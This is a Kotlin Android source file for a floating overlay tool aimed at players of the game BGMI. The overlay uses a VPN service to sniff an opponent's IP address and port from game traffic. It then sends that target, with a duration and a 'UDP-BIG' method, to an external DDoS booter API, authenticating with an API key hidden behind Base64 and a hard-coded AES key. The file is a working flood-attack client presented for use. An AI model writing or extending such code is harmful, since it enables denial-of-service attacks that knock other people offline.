package com.teamjadugar.apk

import android.app.Activity
import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.net.VpnService
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.*
import java.net.HttpURLConnection
import java.net.URL
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class FloatingService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var floatingView: View
    private lateinit var bubbleView: View
    
    private lateinit var etIp: EditText
    private lateinit var etPort: EditText
    private lateinit var tvTime: TextView
    private lateinit var btnAttack: Button
    private lateinit var btnGetIp: Button
    private lateinit var tvLog: TextView
    private var selectedTime = 120

    companion object {
        var instance: FloatingService? = null
        var etIpRef: EditText? = null
        var etPortRef: EditText? = null
        var btnGetIpRef: Button? = null

        fun onIpFound(ip: String, port: String) {
            Handler(Looper.getMainLooper()).post {
                etIpRef?.setText(ip)
                etPortRef?.setText(port)
                btnGetIpRef?.text = "IP FOUND ✅"
                btnGetIpRef?.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                btnGetIpRef?.setTextColor(android.graphics.Color.BLACK)
                Toast.makeText(instance, "BGMI IP Caught: $ip", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private val paramsPanel = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
        PixelFormat.TRANSLUCENT
    )

    private val paramsBubble = WindowManager.LayoutParams(
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.WRAP_CONTENT,
        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
        PixelFormat.TRANSLUCENT
    )

    override fun onCreate() {
        super.onCreate()
        instance = this
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager

        paramsPanel.gravity = Gravity.TOP or Gravity.START
        paramsPanel.x = 50
        paramsPanel.y = 150
        floatingView = LayoutInflater.from(this).inflate(R.layout.floating_panel, null)

        paramsBubble.gravity = Gravity.TOP or Gravity.START
        paramsBubble.x = 50
        paramsBubble.y = 150
        bubbleView = LayoutInflater.from(this).inflate(R.layout.floating_bubble, null)

        windowManager.addView(floatingView, paramsPanel)

        etIp = floatingView.findViewById(R.id.fEtIp)
        etPort = floatingView.findViewById(R.id.fEtPort)
        tvTime = floatingView.findViewById(R.id.fTvTime)
        tvLog = floatingView.findViewById(R.id.tvLog)
        btnAttack = floatingView.findViewById(R.id.fBtnAttack)
        btnGetIp = floatingView.findViewById(R.id.fBtnGetIp)
        val btnVpnOff = floatingView.findViewById<Button>(R.id.fBtnVpnOff)
        val seekBar = floatingView.findViewById<SeekBar>(R.id.fSeekBar)
        
        etIpRef = etIp
        etPortRef = etPort
        btnGetIpRef = btnGetIp

        floatingView.findViewById<TextView>(R.id.btnClose).setOnClickListener { stopSelf() }
        floatingView.findViewById<TextView>(R.id.btnMinimize).setOnClickListener {
            windowManager.removeView(floatingView)
            windowManager.addView(bubbleView, paramsBubble)
        }

        setupBubbleDrag()
        
        bubbleView.setOnClickListener {
            windowManager.removeView(bubbleView)
            windowManager.addView(floatingView, paramsPanel)
        }

        seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
            override fun onProgressChanged(seekBar: SeekBar?, progress: Int, fromUser: Boolean) {
                selectedTime = 60 + (progress * 10) 
                tvTime.text = "DURATION: ${selectedTime}s"
            }
            override fun onStartTrackingTouch(seekBar: SeekBar?) {}
            override fun onStopTrackingTouch(seekBar: SeekBar?) {}
        })

        // YAHAN HAI VPN PERMISSION KA SCENE
        btnGetIp.setOnClickListener {
            tvLog.text = "> REQUESTING VPN..."
            btnGetIp.text = "WAIT..."
            
            // Check VPN Permission
            val intent = VpnService.prepare(this)
            if (intent != null) {
                // Permission nahi hai, popup dikhao
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                tvLog.text = "> ALLOW VPN IN POPUP"
                btnGetIp.text = "ALLOW VPN!"
            } else {
                // Permission pehle se hai
                startVpnService()
            }
        }

        btnVpnOff.setOnClickListener {
            stopService(Intent(this, VpnService::class.java))
            tvLog.text = "> VPN STOPPED"
            btnGetIp.text = "GET IP"
            btnGetIp.isEnabled = true
            btnGetIp.setBackgroundColor(android.graphics.Color.parseColor("#1F2937"))
            btnGetIp.setTextColor(android.graphics.Color.parseColor("#FBBF24"))
        }

        btnAttack.setOnClickListener {
            val ip = etIp.text.toString().trim()
            val port = etPort.text.toString().trim()
            if (ip.isEmpty() || port.isEmpty()) {
                Toast.makeText(this, "IP or Port missing!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            btnAttack.text = "LAUNCHING..."
            btnAttack.isEnabled = false
            tvLog.text = "> ATTACK SENT [${selectedTime}s]"
            executeAttack(ip, port, selectedTime)
        }

        setupPanelDragAndResize()
    }

    fun startVpnService() {
        tvLog.text = "> SNIFFING BGMI..."
        btnGetIp.text = "SNIFFING..."
        btnGetIp.isEnabled = false
        startService(Intent(this, VpnService::class.java))
    }

    private var initialX = 0
    private var initialY = 0
    private var initialTouchX = 0f
    private var initialTouchY = 0f

    private fun setupPanelDragAndResize() {
        val header = floatingView.findViewById<LinearLayout>(R.id.headerLayout)
        header.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialX = paramsPanel.x
                    initialY = paramsPanel.y
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    paramsPanel.x = initialX + (event.rawX - initialTouchX).toInt()
                    paramsPanel.y = initialY + (event.rawY - initialTouchY).toInt()
                    windowManager.updateViewLayout(floatingView, paramsPanel)
                    true
                }
                else -> false
            }
        }

        val resizeHandle = floatingView.findViewById<ImageView>(R.id.resizeHandle)
        var initialWidth = 0
        var initialHeight = 0
        resizeHandle.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    initialWidth = floatingView.width
                    initialHeight = floatingView.height
                    initialTouchX = event.rawX
                    initialTouchY = event.rawY
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val newWidth = initialWidth + (event.rawX - initialTouchX).toInt()
                    val newHeight = initialHeight + (event.rawY - initialTouchY).toInt()
                    
                    paramsPanel.width = if (newWidth > 300) newWidth else 300
                    paramsPanel.height = if (newHeight > 200) newHeight else WindowManager.LayoutParams.WRAP_CONTENT
                    
                    windowManager.updateViewLayout(floatingView, paramsPanel)
                    true
                }
                else -> false
            }
        }
    }

    private var bubbleInitialX = 0
    private var bubbleInitialY = 0
    private var bubbleInitialTouchX = 0f
    private var bubbleInitialTouchY = 0f
    private var isBubbleDragging = false

    private fun setupBubbleDrag() {
        bubbleView.setOnTouchListener { _, event ->
            when (event.action) {
                MotionEvent.ACTION_DOWN -> {
                    bubbleInitialX = paramsBubble.x
                    bubbleInitialY = paramsBubble.y
                    bubbleInitialTouchX = event.rawX
                    bubbleInitialTouchY = event.rawY
                    isBubbleDragging = false
                    true
                }
                MotionEvent.ACTION_MOVE -> {
                    val dx = event.rawX - bubbleInitialTouchX
                    val dy = event.rawY - bubbleInitialTouchY
                    if (Math.abs(dx) > 10 || Math.abs(dy) > 10) {
                        isBubbleDragging = true
                        paramsBubble.x = bubbleInitialX + dx.toInt()
                        paramsBubble.y = bubbleInitialY + dy.toInt()
                        windowManager.updateViewLayout(bubbleView, paramsBubble)
                    }
                    true
                }
                MotionEvent.ACTION_UP -> {
                    if (!isBubbleDragging) {
                        bubbleView.performClick()
                    }
                    true
                }
                else -> false
            }
        }
    }

    private fun executeAttack(ip: String, port: String, time: Int) {
        Thread {
            try {
                val apiUrl = "https://specterapi.duckdns.org/api/v1/execute"
                val encryptedKey = "dDNad1gyeHBkbVZmTURZMVlUTXhPREEzT0dZelpXWmpNVGxsTUdKbE56SXdNVEF5WlRsaE4yVT0="
                val apiKey = decryptData(encryptedKey)

                val url = URL(apiUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-api-key", apiKey)
                conn.doOutput = true

                val jsonInput = """{"target":"$ip","port":$port,"duration":$time,"method":"UDP-BIG"}"""
                conn.outputStream.use { os -> os.write(jsonInput.toByteArray()) }

                Handler(Looper.getMainLooper()).post {
                    if (conn.responseCode in 200..201) {
                        btnAttack.text = "LAUNCHED ✅"
                        btnAttack.setBackgroundColor(android.graphics.Color.parseColor("#22C55E"))
                        tvLog.text = "> SUCCESS! TARGET DOWN"
                    } else {
                        btnAttack.text = "LAUNCH 🚀"
                        btnAttack.isEnabled = true
                        tvLog.text = "> ERROR: ${conn.responseCode}"
                    }
                }
            } catch (e: Exception) {
                Handler(Looper.getMainLooper()).post {
                    btnAttack.text = "LAUNCH 🚀"
                    btnAttack.isEnabled = true
                    tvLog.text = "> NETWORK FAIL"
                }
            }
        }.start()
    }

    private fun decryptData(encryptedData: String): String {
        return try {
            val secretKey = "JadugarSecretKey1234567890123456" 
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            val keySpec = SecretKeySpec(secretKey.toByteArray(), "AES")
            cipher.init(Cipher.DECRYPT_MODE, keySpec)
            String(cipher.doFinal(Base64.decode(encryptedData, Base64.DEFAULT)))
        } catch (e: Exception) { "" }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            if (::floatingView.isInitialized) windowManager.removeView(floatingView)
            if (::bubbleView.isInitialized) windowManager.removeView(bubbleView)
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
